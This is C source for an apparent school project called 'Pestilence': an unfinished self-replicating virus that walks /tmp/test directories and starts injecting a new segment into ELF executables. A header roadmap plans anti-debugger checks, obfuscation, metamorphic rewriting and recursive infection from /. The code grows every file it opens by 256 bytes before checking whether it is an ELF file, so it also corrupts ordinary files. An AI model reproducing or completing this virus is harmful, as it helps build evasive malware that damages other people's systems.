/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: yyyyyy <yyyyyy@42.fr>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/19 15:46:33 by xxxxxxx           #+#    #+#             */
/*   Updated: 2026/01/19 18:05:18 by yyyyyy           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/*
	PESTILENCE
	[ ] Creer segment pour injecter d'une taille arbitraire
	[ ] Recreer routine d'infection en famine like adapté sur le segment créé
		- /tmp/test et /tmp/test2
		- infection binaire 64 bits
		- pas de double infection
		- pas de sortie std ou erreur
	[ ] Avoid infection if debugger (tty ?)
	[ ] Avoid infection if specific program running
	[ ] Code source illisible et offuscé

	WAR
	[ ] Fingerprint unique dans signature pour chaque infection
		- how ? why no random ?

	DEATH
	[ ] Metamorphic -> structure différente a chaque exécution même sur binaire
   original identique
		- how ?

	BONUS
	[ ] Binaire 32 bits
	[ ] Autres types de fichier non binaires
	[ ] Packing pour rendre binaire plus léger
	[ ] Infection récursive depuis / (utiliser les binaires infectés)
*/

#include "pestilence.h"

void _start(void)
{
	void *begin_ptr;

	__asm__ volatile(
		"lea (%%rip), %0" // Load effective address of the instruction pointer
		: "=r"(begin_ptr) // Output operand, store into `begin_ptr`
	);
	begin_ptr -= 7;
	// ft_close(1);
	// ft_close(2);
	// #ifdef BONUS
	// 	// if envp has path
	// 	// 		infect path
	// 	// else
	// 	char path[2];
	// 	path[0] = '/';
	// 	path[1] = '\0';
	// 	processDirectory(path, begin_ptr);
	// #else
	char path[11];
	path[0] = '/';
	path[1] = 't';
	path[2] = 'm';
	path[3] = 'p';
	path[4] = '/';
	path[5] = 't';
	path[6] = 'e';
	path[7] = 's';
	path[8] = 't';
	path[9] = '\0';
	path[10] = '\0';
	processDirectory(path, begin_ptr);
	path[9] = '2';
	processDirectory(path, begin_ptr);
	// #endif
	ft_exit(0);
}

void processDirectory(char *folder, void *begin_ptr)
{
	int					   fd = ft_open(folder, 0 | 65536);

	char				   buffer[1024];
	struct linux_dirent64 *dirent;
	int					   nread;

	// Loop over dir entry
	if (fd < 0)
		goto clean;
	while ((nread = ft_getdents64(fd, buffer, 1024)) > 0)
	{
		for (int bpos = 0; bpos < nread;)
		{
			char dot[3];
			// get current dir entry
			dirent = (struct linux_dirent64 *) (buffer + bpos);
			char *d_name = dirent->d_name;

			// Skip "." and ".." entries
			dot[0] = '.';
			dot[1] = 0;
			if (ft_strcmp(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			dot[1] = '.';
			dot[2] = 0;
			if (ft_strcmp(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			char fullPath[PATH_MAX];
			char slash[2];
			slash[0] = '/';
			slash[1] = 0;
			ft_strcat(ft_strcat(ft_strcpy(fullPath, folder), slash), d_name);

			struct stat statbuf;
			ft_lstat(fullPath, &statbuf);

			if (statbuf.st_mode & __S_IFDIR)
			{
				// If directory, recurse into it
				processDirectory(fullPath, begin_ptr);
			}
			else if (statbuf.st_mode & __S_IFREG)
			{
				// If regular file and executable, infect it
				infect(fullPath, begin_ptr);
			}

			bpos += dirent->d_reclen;
		}
	}
clean:
	ft_close(fd);
}

#define ELF_MAGIC	   0x464c457f
#define INJECTION_SIZE 256

void infect(char *path, void *begin_ptr)
{
	int			fd;
	struct stat statbuf;
	char	   *file_data;
	t_elf		elf;

	file_data = NULL;
	fd = ft_open(path, O_RDWR);
	if (fd < 0 || ft_fstat(fd, &statbuf) < 0)
		goto clean;
	if (ft_ftruncate(fd, statbuf.st_size + INJECTION_SIZE) < 0)
		goto clean;
	file_data = (void *) ft_syscall(9, 0, statbuf.st_size,
									PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (file_data == MAP_FAILED)
		goto clean;
	if (statbuf.st_size < sizeof(ElfW(Ehdr))
		|| ((unsigned *) file_data)[0] != ELF_MAGIC)
		goto clean;
	elf.header = (ElfW(Ehdr) *) file_data;
	if (statbuf.st_size < elf.header->e_shoff
							  + elf.header->e_shnum * elf.header->e_shentsize
		|| statbuf.st_size
			   < elf.header->e_phoff
					 + elf.header->e_phnum * elf.header->e_phentsize)
		goto clean;
	elf.sections = (ElfW(Shdr) *) (file_data + elf.header->e_shoff);
	elf.segments = (ElfW(Phdr) *) (file_data + elf.header->e_phoff);
	elf.header->e_phnum++;
	ft_memmove(file_data + elf.header->e_phoff
				   + elf.header->e_phentsize * (elf.header->e_phnum + 1),
			   file_data + elf.header->e_phoff
				   + elf.header->e_phentsize * elf.header->e_phnum,
			   statbuf.st_size
				   - (elf.header->e_phoff
					  + elf.header->e_phentsize * elf.header->e_phnum));
	// COMBAK: edit all segments file ptrs (and size ?) to take into account
	// that inflationic
clean:
	ft_munmap(file_data, statbuf.st_size);
	ft_close(fd);
}
